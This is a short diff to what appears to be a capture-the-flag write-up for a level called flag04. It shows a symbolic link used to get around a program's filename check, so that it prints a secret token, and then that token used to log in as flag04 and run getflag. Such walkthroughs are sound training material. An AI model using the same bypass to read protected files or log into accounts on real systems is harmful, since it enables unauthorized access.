@@ -43,3 +43,9 @@ Program only checks if first parameter is equal to "token". We can use symoblic 
 > cd /home/flag04/
 > ./flag04 /home/level04/link
 06508b5e-8909-4f38-b630-fdb148a848a2
+
+We can now use obtained token to login as flag04 user and execute getflag command.
+> login: flag04
+> password: 06508b5e-8909-4f38-b630-fdb148a848a2
+> getflag
+You have successfully executed getflag on a target account.
